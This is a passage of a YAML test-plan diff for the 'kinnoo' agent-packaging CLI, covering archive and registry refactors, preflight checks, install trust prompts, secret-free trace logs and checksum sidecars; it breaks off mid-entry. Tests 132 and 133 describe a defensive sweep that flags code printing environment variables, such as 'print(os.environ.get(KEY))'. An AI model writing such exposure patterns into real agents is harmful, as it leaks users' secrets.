+    expected: Local registry behavior is mediated by a backend abstraction with canonical local layout
+    pass_criteria: Contract methods exist, local backend conforms to path scheme, and call sites can depend on abstraction instead of concrete filesystem logic
+    notes: "[agent] test deprecated: Superseded by feature13 archive/registry abstraction coverage in test107."
+    automated: true
+    automation_path: tests/test_registry.py::test_registry_backend_contract_and_local_layout
+    covers:
+      - feature: feature12
+        ac: AC9
+
+  - id: test97
+    title: publish CLI accepts --local and enforces usage on invalid invocation
+    type: deprecated
+    preconditions: kinnoo CLI installed
+    steps:
+      - step1: Run `kinnoo publish` with missing archive argument and capture output/exit code
+      - step2: Run `kinnoo publish <archive.kno> --local` using a valid archive fixture
+      - step3: Verify command routes through local backend path without changing publish semantics
+    expected: CLI prints usage for invalid invocation and treats `--local` as explicit local publish
+    pass_criteria: Missing-argument case exits non-zero with usage text; `--local` publish exits success and stores artifact in local registry
+    notes: "[agent] test deprecated: Superseded by feature13 publish + CLI validation coverage in test109, test111, and test118."
+    automated: true
+    automation_path: tests/test_cli_registry.py::test_publish_cli_usage_and_local_flag
+    covers:
+      - feature: feature12
+        ac: AC2
+
+  - id: test98
+    title: publish extracts name/version and rejects duplicate name+version
+    type: deprecated
+    preconditions: kinnoo CLI installed; valid `.kno` archive fixture with manifest name/version; local registry sandbox
+    steps:
+      - step1: Run `kinnoo publish <archive.kno>` and verify archive is copied to `<registry>/<name>/<version>/`
+      - step2: Re-run publish for the same archive/version tuple
+      - step3: Capture duplicate publish output and exit code
+    expected: First publish succeeds with correct placement; second publish fails with clear duplicate error
+    pass_criteria: Initial publish writes expected path; duplicate attempt exits non-zero and reports no-silent-overwrite behavior
+    notes: "[agent] test deprecated: Superseded by feature13 publish source/target and rollover coverage in test109 and test110."
+    automated: true
+    automation_path: tests/test_cli_registry.py::test_publish_extracts_metadata_and_blocks_duplicate_version
+    covers:
+      - feature: feature12
+        ac: AC1
+      - feature: feature12
+        ac: AC7
+
+  - id: test99
+    title: install selector parsing preserves file-path install behavior
+    type: deprecated
+    preconditions: kinnoo CLI installed; fixtures include local `.kno` file and registry-like selector strings
+    steps:
+      - step1: Run install with a filesystem archive path and verify file-install path is selected
+      - step2: Run install with `<name>` and `<name>==<version>` selectors and verify registry-selection path is selected
+      - step3: Validate error messaging for ambiguous/invalid selector forms
+    expected: Parser cleanly disambiguates archive file paths from registry selectors while preserving legacy file install behavior
+    pass_criteria: Path input behaves exactly as existing `kinnoo install <file.kno>` flow; selector inputs route to registry logic with clear errors for invalid forms
+    notes: "[agent] test deprecated: Superseded by feature13 install selector and compatibility coverage in test112, test113, test116, and test118."
+    automated: true
+    automation_path: tests/test_cli_registry.py::test_install_selector_parsing_preserves_file_install
+    covers:
+      - feature: feature12
+        ac: AC8
+
+  - id: test100
+    title: Registry resolver selects latest and exact versions across multiple published versions
+    type: deprecated
+    preconditions: Local registry sandbox contains multiple versions of the same agent (e.g., 1.0.0, 1.1.0, 2.0.0)
+    steps:
+      - step1: Resolve `<name>` and verify resolver returns latest published version
+      - step2: Resolve `<name>==1.1.0` and verify exact version is returned
+      - step3: Resolve unknown name/version and verify clear not-found errors
+    expected: Resolver supports deterministic latest-version and exact-version lookups with actionable failures
+    pass_criteria: Latest resolution consistently picks highest version; exact resolution returns requested version; missing cases fail with clear messages
+    notes: "[agent] test deprecated: Superseded by feature13 install resolution coverage in test112 and test113."
+    automated: true
+    automation_path: tests/test_registry.py::test_registry_version_resolution_latest_and_exact
+    covers:
+      - feature: feature12
+        ac: AC3
+      - feature: feature12
+        ac: AC4
+
+  - id: test101
+    title: install by registry name/version reuses install pipeline without network
+    type: deprecated
+    preconditions: Local registry sandbox has published agent versions; network access disabled or blocked for test process
+    steps:
+      - step1: Run `kinnoo install <name>` and verify install succeeds from local registry
+      - step2: Run `kinnoo install <name>==<version>` and verify specific version is installed
+      - step3: Verify installed agent runs successfully via existing run flow
+    expected: Name-based installs use local registry resolution and then reuse existing install pipeline end-to-end
+    pass_criteria: Both latest and explicit-version installs exit 0 without network dependency and produce runnable installed agents
+    notes: "[agent] test deprecated: Superseded by feature13 install flow coverage in test112, test113, and test116."
+    automated: true
+    automation_path: tests/test_cli_registry.py::test_install_from_registry_name_and_version_uses_existing_pipeline
+    covers:
+      - feature: feature12
+        ac: AC3
+      - feature: feature12
+        ac: AC4
+
+  - id: test102
+    title: list shows local agents with latest version and description
+    type: deprecated
+    preconditions: Local registry sandbox contains at least two agent names, and one name has multiple versions
+    steps:
+      - step1: Run `kinnoo list` against populated local registry fixture
+      - step2: Verify each listed agent includes name, latest version, and description
+      - step3: Confirm latest version shown for multi-version agent matches resolver ordering
+    expected: List output provides concise inventory of published local agents with correct latest-version metadata
+    pass_criteria: Output rows include required columns and reflect correct latest version for agents with multiple versions
+    notes: "[agent] test deprecated: Superseded by feature13 local/remote list mode coverage in test114."
+    automated: true
+    automation_path: tests/test_cli_registry.py::test_list_shows_name_latest_version_and_description
+    covers:
+      - feature: feature12
+        ac: AC5
+
+  - id: test103
+    title: search filters local registry by name or description substring
+    type: deprecated
+    preconditions: Local registry sandbox contains agent entries with distinct names and descriptions
+    steps:
+      - step1: Run `kinnoo search <query>` matching a name substring
+      - step2: Run `kinnoo search <query>` matching a description substring
+      - step3: Run `kinnoo search <query>` with no expected matches
+    expected: Search returns matching entries for name/description substring and handles no-match case clearly
+    pass_criteria: Matching queries return only expected entries; no-match query returns empty/no-results guidance without errors
+    notes: "[agent] test deprecated: Superseded by feature13 local/remote search mode coverage in test115."
+    automated: true
+    automation_path: tests/test_cli_registry.py::test_search_filters_by_name_and_description_substring
+    covers:
+      - feature: feature12
+        ac: AC6
+
+  - id: test104
+    title: Docs cover local registry commands and versioned install examples
+    type: deprecated
+    preconditions: README.md and docs/manifest-schema-reference.md are present and readable
+    steps:
+      - step1: Verify docs include `kinnoo publish <archive.kno>` and `kinnoo publish <archive.kno> --local` examples
+      - step2: Verify docs include install selector usage for `<name>`, `<name>==<version>`, and `<file.kno>` compatibility
+      - step3: Verify docs include `kinnoo list` and `kinnoo search <query>` examples, including a multi-version latest-resolution example
+    expected: Documentation describes local registry command surface and version-resolution usage clearly
+    pass_criteria: Required command and example coverage appears in docs with consistent syntax
+    notes: "[agent] test deprecated: Superseded by feature13 documentation coverage in test117."
+    automated: true
+    automation_path: tests/test_docs.py::test_feature12_docs_cover_local_registry_flows
+    covers: []
+
+  - id: test105
+    title: kinnoo pack prompts before overwriting existing archive
+    type: integration
+    preconditions: kinnoo CLI installed; valid agent fixture; existing output `.kno` file at target path
+    steps:
+      - step1: Create or pre-place an existing target archive (e.g., `myagent.kno`)
+      - step2: Run `kinnoo pack <agent-dir>` and provide `n` at prompt
+      - "step3: Verify prompt text matches `(archive.kno) already exists - are you sure you want to overwrite? (y/n): ` format with concrete archive filename"
+      - step4: Verify command exits non-zero and existing archive remains unchanged after `n`
+      - step5: Re-run `kinnoo pack <agent-dir>` and provide `y` at prompt
+      - step6: Verify command exits 0 and existing archive is overwritten after `y`
+    expected: Pack requires explicit confirmation before overwriting existing `.kno`; declines preserve existing file; confirmations allow overwrite
+    pass_criteria: Prompt is shown in overwrite scenario, `n` path aborts without mutation, and `y` path overwrites and succeeds
+    automated: true
+    automation_path: tests/test_pack.py::test_pack_prompts_before_overwrite_existing_archive
+    covers:
+      - feature: feature13
+        ac: AC3
+
+  - id: test106
+    title: kinnoo pack --bump updates manifest version and always prints packed version
+    type: integration
+    preconditions: kinnoo CLI installed; valid agent fixture with semver version in `kinnoo.yaml`
+    steps:
+      - step1: Run `kinnoo pack <agent-dir>` without `--bump` and capture output
+      - "step2: Verify output includes `[kinnoo pack] Agent version: <current-version>` and archive is created"
+      - step3: Run `kinnoo pack <agent-dir> --bump patch` and verify `kinnoo.yaml` version increments patch and output line reflects new version
+      - step4: Run `kinnoo pack <agent-dir> --bump minor` and verify minor increment with patch reset, and output line reflects new version
+      - step5: Run `kinnoo pack <agent-dir> --bump major` and verify major increment with minor/patch reset, and output line reflects new version
+      - step6: Run with invalid bump value and verify command fails with usage/error and no successful pack-version line
+    expected: "`--bump` automates manifest semver increments before packaging, and all successful pack runs print `[kinnoo pack] Agent version: <version #>`"
+    pass_criteria: No-bump and patch/minor/major scenarios produce correct versions and version output line; invalid bump is rejected and does not emit success version line
+    automated: true
+    automation_path: tests/test_pack.py::test_pack_bump_flag_and_version_output_line
+    covers:
+      - feature: feature13
+        ac: AC2
+
+  - id: test107
+    title: pack writes to canonical local archive path and exposes stable storage abstraction
+    type: integration
+    preconditions: kinnoo CLI installed; valid agent fixture; local archive root writable
+    steps:
+      - step1: Run `kinnoo pack <agent-dir>` with manifest name/version
+      - step2: Verify archive exists at `~/.kinnoo/archive/<agent>/<version>/<agent>.kno`
+      - step3: Verify pack output includes archive destination and version line
+      - step4: Verify storage-resolution code path uses abstraction layer suitable for future backend swap
+    expected: Pack archives are written to canonical local archive location with deterministic output and abstraction-backed resolution
+    pass_criteria: Archive path and output contracts match spec; abstraction seam exists and is exercised by command flow
+    automated: true
+    automation_path: tests/test_pack_refactor.py::test_pack_uses_canonical_archive_path_and_storage_abstraction
+    covers:
+      - feature: feature13
+        ac: AC1
+      - feature: feature13
+        ac: AC2
+      - feature: feature13
+        ac: AC9
+
+  - id: test108
+    title: pack prompts on existing canonical archive path and preserves file on decline
+    type: integration
+    preconditions: canonical archive target already exists for fixture agent/version
+    steps:
+      - step1: Run `kinnoo pack <agent-dir>` where target archive path already exists and provide `n`
+      - step2: Verify command exits non-zero and existing archive remains unchanged
+      - step3: Re-run and provide `y`, then verify overwrite succeeds
+    expected: Overwrite confirmation is enforced for canonical archive output path
+    pass_criteria: Decline path preserves existing archive; confirm path overwrites and succeeds
+    automated: true
+    automation_path: tests/test_pack_refactor.py::test_pack_overwrite_confirmation_in_archive_mode
+    covers:
+      - feature: feature13
+        ac: AC3
+
+  - id: test109
+    title: publish by agent name resolves latest local archived version to mock registry target
+    type: integration
+    preconditions: local archive contains multiple versions for same agent; mock registry root writable
+    steps:
+      - step1: Run `kinnoo publish <agent-name>`
+      - step2: Verify latest archived version is selected as publish source
+      - step3: Verify published file lands at `registry-scratch/jerry/<agent>/<version>/<agent>.kno`
+      - step4: Verify publish output includes source archive path and target registry path
+    expected: Publish resolves latest local archive version by name, writes to canonical mock registry path, and reports clear outcome paths
+    pass_criteria: Selected source version equals latest archived version; destination path matches spec; output includes source and target paths
+    automated: true
+    automation_path: tests/test_publish_refactor.py::test_publish_name_resolves_latest_local_archive
+    covers:
+      - feature: feature13
+        ac: AC4
+      - feature: feature13
+        ac: AC5
+
+  - id: test110
+    title: publish existing tagged version rolls old artifact to untagged slot
+    type: integration
+    preconditions: mock registry already has tagged artifact at target version for agent
+    steps:
+      - step1: Publish same agent/version again with new source payload
+      - step2: Verify prior tagged artifact is preserved as `untagged-<n>`
+      - step3: Verify new payload is written to tagged version path
+      - step4: Verify output includes rollover action details
+    expected: Publish never hard-overwrites existing tagged version and uses deterministic untagged rollover behavior
+    pass_criteria: Untagged copy exists, tagged destination contains new payload, and rollout messaging is printed
+    automated: true
+    automation_path: tests/test_publish_refactor.py::test_publish_rolls_existing_tagged_to_untagged
+    covers:
+      - feature: feature13
+        ac: AC6
+      - feature: feature13
+        ac: AC7
+
+  - id: test111
+    title: publish reports clear errors for missing or invalid local archive source
+    type: unit
+    preconditions: mock/local archive fixtures for missing agent, no versions, and invalid metadata
+    steps:
+      - step1: Run `kinnoo publish <agent-name>` where agent has no archived versions
+      - step2: Run publish where resolved archive metadata is invalid/corrupt
+      - step3: Capture error output and exit codes
+    expected: Publish fails fast with explicit actionable error messages for source resolution/metadata failures
+    pass_criteria: Non-zero exits and error output clearly identifies missing versions or metadata validation issues
+    automated: true
+    automation_path: tests/test_publish_refactor.py::test_publish_errors_for_missing_or_invalid_archive_source
+    covers:
+      - feature: feature13
+        ac: AC8
+
+  - id: test112
+    title: install by name resolves latest from mock registry via backend abstraction
+    type: integration
+    preconditions: mock registry contains multiple versions for agent and install fixture environment is ready
+    steps:
+      - step1: Run `kinnoo install <name>`
+      - step2: Verify latest version from mock registry is selected and installed
+      - step3: Verify backend abstraction boundary is used for source resolution
+    expected: Name-based install uses mock registry latest resolution with architecture ready for future remote registry backend
+    pass_criteria: Installed version is latest available in mock registry and resolution flow is abstraction-backed
+    automated: true
+    automation_path: tests/test_install_refactor.py::test_install_name_resolves_latest_from_mock_registry
+    covers:
+      - feature: feature13
+        ac: AC10
+
+  - id: test113
+    title: install name==version resolves exact version from mock registry
+    type: integration
+    preconditions: mock registry contains at least two versions for same agent
+    steps:
+      - step1: Run `kinnoo install <name>==<version>` for known existing version
+      - step2: Verify installed artifact matches requested version exactly
+      - step3: Run with missing version and verify clear error
+    expected: Version-qualified install resolves exact mock registry version and rejects missing versions clearly
+    pass_criteria: Exact version installs successfully; missing version path exits non-zero with actionable message
+    automated: true
+    automation_path: tests/test_install_refactor.py::test_install_name_equals_version_from_mock_registry
+    covers:
+      - feature: feature13
+        ac: AC11
+
+  - id: test114
+    title: list supports default local, --local, and --remote source modes
+    type: integration
+    preconditions: local archive and mock registry each contain at least one agent with metadata
+    steps:
+      - step1: Run `kinnoo list` and verify local archive inventory is shown
+      - step2: Run `kinnoo list --local` and verify output matches default local behavior
+      - step3: Run `kinnoo list --remote` and verify mock registry inventory is shown
+      - step4: Verify each mode outputs name, latest version, and description
+    expected: List command source selection behaves as specified with stable output schema
+    pass_criteria: Default/local/remote modes each return correct source data and required columns
+    automated: true
+    automation_path: tests/test_cli_registry_modes.py::test_list_default_local_and_remote_modes
+    covers:
+      - feature: feature13
+        ac: AC12
+      - feature: feature13
+        ac: AC13
+      - feature: feature13
+        ac: AC14
+
+  - id: test115
+    title: search supports default local, --local, and --remote source modes
+    type: integration
+    preconditions: local archive and mock registry contain searchable names/descriptions
+    steps:
+      - step1: Run `kinnoo search <query>` and verify local archive filtering is used by default
+      - step2: Run `kinnoo search --local <query>` and verify local filtering behavior
+      - step3: Run `kinnoo search --remote <query>` and verify mock registry filtering behavior
+      - step4: Verify name/description substring matching is case-insensitive in all modes
+    expected: Search correctly filters by source mode with consistent substring semantics
+    pass_criteria: Each mode returns only expected matches from the selected source
+    automated: true
+    automation_path: tests/test_cli_registry_modes.py::test_search_default_local_and_remote_modes
+    covers:
+      - feature: feature13
+        ac: AC15
+      - feature: feature13
+        ac: AC16
+      - feature: feature13
+        ac: AC17
+
+  - id: test116
+    title: install file-path mode remains backward compatible
+    type: integration
+    preconditions: valid `.kno` archive file available on filesystem
+    steps:
+      - step1: Run `kinnoo install <file-path/file.kno>`
+      - step2: Verify install succeeds through existing file-path install flow
+      - step3: Verify selector parsing does not misroute file path as registry name
+    expected: V1 file-path install behavior remains unchanged after registry/archive refactor
+    pass_criteria: File-path installation succeeds and matches prior behavior/output expectations
+    automated: true
+    automation_path: tests/test_install_refactor.py::test_install_file_path_mode_preserved
+    covers:
+      - feature: feature13
+        ac: AC18
+
+  - id: test117
+    title: Docs cover archive-first pack, name-based publish, and source-mode install/list/search
+    type: unit
+    preconditions: README.md and docs/manifest-schema-reference.md are present and readable
+    steps:
+      - step1: Verify docs describe canonical local archive destination for pack
+      - step2: Verify docs describe `kinnoo publish <agent-name>` and mock registry target path
+      - step3: Verify docs describe list/search default local mode plus `--local`/`--remote`
+      - step4: Verify docs describe install modes for name, name==version, and file-path input
+    expected: Documentation reflects feature13 responsibility split and command semantics accurately
+    pass_criteria: Required behavior and examples are present and consistent across docs
+    automated: true
+    automation_path: tests/test_docs.py::test_feature13_docs_cover_archive_registry_refactor
+    covers:
+      - feature: feature13
+        ac: AC2
+      - feature: feature13
+        ac: AC4
+      - feature: feature13
+        ac: AC12
+      - feature: feature13
+        ac: AC15
+
+  - id: test118
+    title: source-mode CLI argument validation returns deterministic usage errors
+    type: unit
+    preconditions: kinnoo CLI installed; command parser available
+    steps:
+      - step1: Run invalid flag combinations (for example `kinnoo list --local --remote` and `kinnoo search --local --remote <query>`)
+      - step2: Run missing-input forms (for example `kinnoo search` with no query, malformed install selectors)
+      - step3: Verify commands exit non-zero with clear usage/error output and do not silently choose unintended sources
+    expected: CLI validates new source-mode arguments strictly and returns stable, actionable errors for invalid combinations/forms
+    pass_criteria: Invalid combinations/forms always fail non-zero with deterministic usage/error messaging and no ambiguous fallback behavior
+    automated: true
+    automation_path: tests/test_cli_registry_modes.py::test_source_mode_argument_validation_errors
+    covers:
+      - feature: feature13
+        ac: AC19
+
+  - id: test119
+    title: publish writes to home-absolute mock registry scratch path
+    type: integration
+    preconditions: local archive contains publishable agent version; HOME is set; mock registry root writable
+    steps:
+      - step1: Run `kinnoo publish <agent-name>` for an agent with archived versions
+      - step2: Verify publish destination path is under `~/kinnoo-mock-registry-scratch/jerry/<agent>/<version>/<agent>.kno`
+      - step3: Verify destination path is absolute and not dependent on current working directory
+      - step4: Verify publish output reports the same absolute target path
+    expected: Publish always targets the home-absolute mock registry scratch path and remains stable regardless of process CWD
+    pass_criteria: Artifact is created at the expected absolute path and command output references that absolute target path
+    automated: true
+    automation_path: tests/test_publish_refactor.py::test_publish_uses_home_absolute_mock_registry_path
+    covers:
+      - feature: feature13
+        ac: AC5
+
+  - id: test120
+    title: preflight mode runs checks without executing entrypoint
+    type: integration
+    preconditions: kinnoo CLI installed; valid agent fixture with observable entrypoint side effect
+    steps:
+      - step1: Run `kinnoo run <agent-dir> --preflight`
+      - step2: Verify preflight checklist output is shown
+      - step3: Verify entrypoint side effect is absent (entrypoint was not executed)
+    expected: Preflight performs validation checks only and does not execute agent logic
+    pass_criteria: Command prints checklist output, exits based on check results, and does not invoke entrypoint execution path
+    automated: true
+    automation_path: tests/test_run_preflight.py::test_preflight_runs_checks_without_entrypoint_execution
+    covers:
+      - feature: feature14
+        ac: AC1
+
+  - id: test121
+    title: preflight validates runtime version against manifest constraint
+    type: unit
+    preconditions: preflight runtime check helper available; fixtures for matching and non-matching `runtime.version`
+    steps:
+      - step1: Run preflight on fixture where interpreter satisfies `runtime.version`
+      - step2: Run preflight on fixture where interpreter violates `runtime.version`
+      - step3: Verify pass/fail output and failure guidance for mismatch
+    expected: Runtime version check correctly enforces manifest constraint semantics
+    pass_criteria: Matching fixture reports pass; mismatch reports fail with actionable version guidance
+    automated: true
+    automation_path: tests/test_run_preflight.py::test_preflight_runtime_version_check
+    covers:
+      - feature: feature14
+        ac: AC2
+
+  - id: test122
+    title: preflight checks env_vars resolvability without exposing values
+    type: integration
+    preconditions: manifest declares env_vars; fixtures for resolved and unresolved variables using environment and `.env`
+    steps:
+      - step1: Run preflight where all declared env_vars are resolvable
+      - step2: Run preflight where one declared env_var is unresolved
+      - step3: Verify output references env var names only and no secret values
+    expected: Preflight reports env_var resolvability accurately and remains names-only for security
+    pass_criteria: Resolved case passes, unresolved case fails, and outputs include names without secret values
+    automated: true
+    automation_path: tests/test_run_preflight.py::test_preflight_env_vars_resolution_and_secret_safety
+    covers:
+      - feature: feature14
+        ac: AC3
+
+  - id: test123
+    title: preflight checks entrypoint existence and dependency readiness
+    type: integration
+    preconditions: fixtures covering existing/missing entrypoint and dependency-ready/dependency-missing states
+    steps:
+      - step1: Run preflight on fixture with missing entrypoint file
+      - step2: Run preflight on fixture with dependency readiness failure
+      - step3: Verify failures are reported separately with actionable guidance
+    expected: Preflight validates entrypoint and dependency checks independently with clear outcomes
+    pass_criteria: Missing entrypoint and dependency readiness failures are both detected and surfaced with clear remediation hints
+    automated: true
+    automation_path: tests/test_run_preflight.py::test_preflight_entrypoint_and_dependency_checks
+    covers:
+      - feature: feature14
+        ac: AC4
+      - feature: feature14
+        ac: AC5
+
+  - id: test124
+    title: preflight checklist output includes pass fail statuses and readiness summary
+    type: integration
+    preconditions: fixtures for all-checks-pass and one-or-more-checks-fail scenarios
+    steps:
+      - step1: Run preflight on passing fixture and capture output
+      - step2: Run preflight on failing fixture and capture output
+      - step3: Verify checklist includes pass/fail status for runtime, env vars, entrypoint, and dependencies
+      - step4: Verify pass scenario prints `Ready to run`, fail scenario prints actionable guidance
+    expected: Preflight checklist and final readiness summary follow stable operator-facing semantics
+    pass_criteria: Checklist sections and statuses are present; `Ready to run` appears only on full pass; failing run includes guidance
+    automated: true
+    automation_path: tests/test_run_preflight.py::test_preflight_checklist_and_ready_summary
+    covers:
+      - feature: feature14
+        ac: AC6
+      - feature: feature14
+        ac: AC7
+
+  - id: test125
+    title: docs cover preflight usage behavior and security contract
+    type: unit
+    preconditions: README.md and docs/manifest-schema-reference.md are present and readable
+    steps:
+      - step1: Verify docs include `kinnoo run <dir> --preflight` usage and checklist behavior
+      - step2: Verify docs state preflight validates without executing entrypoint logic
+      - step3: Verify docs include names-only env var disclosure contract in preflight output
+    expected: Documentation describes preflight command semantics and security expectations clearly
+    pass_criteria: Required preflight usage/behavior/security statements are present and consistent across docs
+    automated: true
+    automation_path: tests/test_docs.py::test_feature14_docs_cover_preflight_contract
+    covers:
+      - feature: feature14
+        ac: AC1
+
+  - id: test126
+    title: install displays summary and prompts for confirmation before installing
+    type: integration
+    preconditions: valid .kno archive with manifest declaring env_vars and dependencies
+    steps:
+      - step1: Run `kinnoo install <archive.kno>` with stdin providing 'y' to proceed
+      - step2: Capture stdout and verify it includes agent name, runtime type, dependency names, and env_var names
+      - step3: Verify confirmation prompt "Continue with install? [y/N]" is displayed
+      - step4: Verify install proceeds after 'y' confirmation
+      - step5: Run again with stdin providing 'n' or empty — verify install aborts
+    expected: Install shows summary with names (never values) and respects y/n prompt
+    pass_criteria: Summary includes all declared names; prompt shown; 'y' proceeds; 'n'/empty aborts with non-zero exit
+    automated: true
+    automation_path: tests/test_trust_baseline.py::test_install_summary_and_confirmation_prompt
+    covers:
+      - feature: feature15
+        ac: AC1
+
+  - id: test127
+    title: install --yes flag bypasses confirmation prompt
+    type: integration
+    preconditions: valid .kno archive with manifest declaring env_vars and dependencies
+    steps:
+      - step1: Run `kinnoo install <archive.kno> --yes` (no stdin)
+      - step2: Verify summary is still displayed (env_var names, dependency names, runtime)
+      - step3: Verify no prompt is shown and install proceeds directly
+      - step4: Run `kinnoo install <archive.kno> -y` and verify same behavior
+    expected: --yes/-y skips confirmation but still shows summary
+    pass_criteria: Summary displayed; no prompt; install completes; both --yes and -y work
+    automated: true
+    automation_path: tests/test_trust_baseline.py::test_install_yes_flag_bypasses_prompt
+    covers:
+      - feature: feature15
+        ac: AC1
+
+  - id: test128
+    title: install warns when .kno.sha256 missing (unverified source)
+    type: integration
+    preconditions: valid .kno archive file WITHOUT accompanying .kno.sha256 file
+    steps:
+      - step1: Run `kinnoo install <archive.kno>` where <archive.kno>.sha256 does not exist
+      - step2: Verify warning "This agent is from an unverified source" is displayed
+      - step3: Verify confirmation prompt "Continue? (y/n)" is shown
+      - step4: Provide 'n' — verify install aborts
+      - step5: Run with --yes — verify warning is shown but prompt is skipped
+      - step6: Run with .kno.sha256 present — verify unverified warning is NOT shown
+    expected: Unverified source warning shown only when .sha256 file is missing; --yes bypasses prompt but not warning
+    pass_criteria: Warning present when .sha256 missing; absent when present; prompt respected; --yes skips prompt
+    automated: true
+    automation_path: tests/test_trust_baseline.py::test_install_unverified_source_warning
+    covers:
+      - feature: feature15
+        ac: AC2
+
+  - id: test129
+    title: kinnoo run writes trace log with safe fields only
+    type: integration
+    preconditions: valid agent directory; kinnoo CLI installed; HOME writable
+    steps:
+      - step1: Run `kinnoo run <agent-dir> '<input>'` and capture exit code
+      - step2: Verify ~/.kinnoo/logs/ directory was created
+      - step3: Find the most recent `run.<TIMESTAMP>.log` file and verify timestamp segment is UTC format
+      - step4: Parse log file as JSON and verify keys are exactly `timestamp`, `agent_name`, `agent-version`, `runtime_type`, `exit_code`
+      - step5: Verify JSON includes agent name, agent version, runtime type, and exit code values
+      - step6: Verify log file does NOT contain the input string
+    expected: Trace log file exists in UTC timestamped filename format with correct JSON safe fields; no input content
+    pass_criteria: Log filename matches run.<TIMESTAMP>.log (UTC); JSON shape and values are correct including `agent-version`; input text is absent
+    automated: true
+    automation_path: tests/test_trust_baseline.py::test_run_trace_log_safe_fields
+    covers:
+      - feature: feature15
+        ac: AC3
+
+  - id: test130
+    title: run trace log never contains env var values or secrets
+    type: integration
+    preconditions: agent with declared env_vars; known secret values set in environment
+    steps:
+      - step1: Set environment variables with known distinctive values (e.g., "SECRET_VALUE_12345")
+      - step2: Run `kinnoo run <agent-dir> '<input>'`
+      - step3: Read the resulting log file
+      - step4: Parse JSON and verify only expected keys exist (`timestamp`, `agent_name`, `agent-version`, `runtime_type`, `exit_code`)
+      - step5: Assert the log file does NOT contain any of the known secret values
+      - step6: Assert the log file does NOT contain the user input string
+    expected: Log file JSON remains limited to safe fields and is completely free of secret values and user input
+    pass_criteria: JSON keyset is exact; none of the known secret values or input content appear anywhere in the log file
+    automated: true
+    automation_path: tests/test_trust_baseline.py::test_run_trace_log_no_secrets
+    covers:
+      - feature: feature15
+        ac: AC4
+
+  - id: test131
+    title: trust code paths include no-secret-values inline comments
+    type: unit
+    preconditions: source files are present and readable
+    steps:
+      - step1: Read all trust-related source files (install_command.py, run_command.py, inspect_command.py, code_sweep.py)
+      - step2: Identify code sites that display or log env var or secret-adjacent data
+      - step3: Verify each site has an inline comment containing "SECURITY INVARIANT" or "no secret values" (case-insensitive)
+    expected: All trust-sensitive code paths are annotated with the no-secret-values invariant
+    pass_criteria: Every trust-sensitive display/log site has an inline security invariant comment
+    automated: true
+    automation_path: tests/test_trust_baseline.py::test_trust_code_has_security_invariant_comments
+    covers:
+      - feature: feature15
+        ac: AC5
+
+  - id: test132
+    title: inspect includes security sweep for env var exposure
+    type: integration
+    preconditions: agent directory with .py files; some files contain print(os.environ) patterns
+    steps:
+      - step1: Create agent fixture with clean source (no exposure patterns)
+      - 'step2: Run kinnoo inspect and verify "Security sweep: no env var exposure patterns detected (heuristic)" message'
+      - step3: Create agent fixture with source containing print(os.environ.get(KEY)) pattern
+      - step4: Run kinnoo inspect and verify warning with file path and line number
+      - step5: Verify .venv/ files are excluded from the sweep
+      - step6: Verify disclaimer about false positives is present
+    expected: Inspect shows security sweep results — clean when no patterns, warnings with detail when patterns found
+    pass_criteria: Clean fixture prints clean message; dirty fixture prints warning with location; .venv excluded; disclaimer shown
+    automated: true
+    automation_path: tests/test_trust_baseline.py::test_inspect_security_sweep
+    covers:
+      - feature: feature15
+        ac: AC6
+
+  - id: test133
+    title: pack runs security sweep as non-blocking warning
+    type: integration
+    preconditions: agent directory with .py files containing exposure patterns; kinnoo pack available
+    steps:
+      - step1: Create agent fixture with source containing env var exposure patterns
+      - step2: Run `kinnoo pack <agent-dir>`
+      - step3: Verify security sweep warnings are printed to stderr or stdout
+      - step4: Verify pack still completes successfully (non-blocking)
+      - step5: Create clean agent fixture and run pack — verify no warnings
+    expected: Pack prints sweep warnings but does not abort; clean agents produce no warnings
+    pass_criteria: Dirty fixture shows warnings but pack succeeds; clean fixture produces no warnings
+    automated: true
+    automation_path: tests/test_trust_baseline.py::test_pack_security_sweep_non_blocking
+    covers:
+      - feature: feature15
+        ac: AC6
+
+  - id: test134
+    title: docs cover trust baseline features and no-secret-values contract
+    type: unit
+    preconditions: README.md and docs/manifest-schema-reference.md are present and readable
+    steps:
+      - step1: Verify docs describe install summary prompt and --yes/-y flag
+      - step2: Verify docs describe unverified source warning
+      - step3: Verify docs describe run trace log location and safe-fields-only policy
+      - step4: Verify docs describe security sweep in inspect/pack
+      - step5: Verify docs state the no-secret-values invariant as a project-wide security contract
+    expected: Documentation covers all trust baseline features and the security invariant
+    pass_criteria: All trust-related behaviors and the no-secret-values contract are documented
+    automated: true
+    automation_path: tests/test_docs.py::test_feature15_docs_cover_trust_baseline
+    covers:
+      - feature: feature15
+        ac: AC1
+      - feature: feature15
+        ac: AC2
+      - feature: feature15
+        ac: AC3
+      - feature: feature15
+        ac: AC5
+      - feature: feature15
+        ac: AC6
+
+  - id: test135
+    title: pack generates sha256 sidecar next to output archive
+    type: integration
+    preconditions: "valid agent directory; `kinnoo pack` command available"
+    steps:
+      - step1: Run `kinnoo pack <agent-dir>`
+      - step2: Verify generated `.kno` archive exists
+      - step3: Verify sibling `.kno.sha256` file exists
+      - step4: Verify sidecar contains a SHA256 digest and archive filename token
+    expected: Packing produces archive and checksum sidecar together
+    pass_criteria: "`.kno` and matching `.kno.sha256` both exist and checksum line format is valid"
+    automated: true
+    automation_path: tests/test_archive_integrity.py::test_pack_generates_checksum_sidecar
+    covers:
+      - feature: feature16
+        ac: AC1
+
+  - id: test136
+    title: pack writes checksum alongside local archive artifact
+    type: integration
+    preconditions: archive-first local pack destination is enabled
+    steps:
+      - step1: Run `kinnoo pack <agent-dir>`
+      - step2: Resolve local archive output path under `~/.kinnoo/archive/<name>/<version>/`
+      - step3: Verify `.kno.sha256` is present next to archived `.kno`
+    expected: Local archive storage includes checksum sidecar alongside archive artifact
+    pass_criteria: Destination directory contains both `<name>.kno` and `<name>.kno.sha256`
+    automated: true
+    automation_path: tests/test_archive_integrity.py::test_pack_stores_checksum_with_local_archive
+    covers:
+      - feature: feature16
+        ac: AC5
+
+  - id: test137
+    title: checksum utility computes and parses stable sha256 values
+    type: unit
+    preconditions: checksum utility module is importable
+    steps:
+      - step1: Create fixture archive file with deterministic bytes
+      - step2: Compute SHA256 using checksum utility
+      - step3: Parse sidecar content using checksum parser helper
+      - step4: Verify parsed expected digest matches computed digest
+    expected: Shared checksum helpers return deterministic and parseable integrity values
+    pass_criteria: Compute/parse helpers produce matching digest outputs for fixture archive
+    automated: true
+    automation_path: tests/test_archive_integrity.py::test_checksum_helpers_compute_and_parse
+    covers:
+
+  - id: test138
+    title: install verifies checksum when sidecar exists
+    type: integration
+    preconditions: "`.kno` archive with matching `.kno.sha256` sidecar exists"
+    steps:
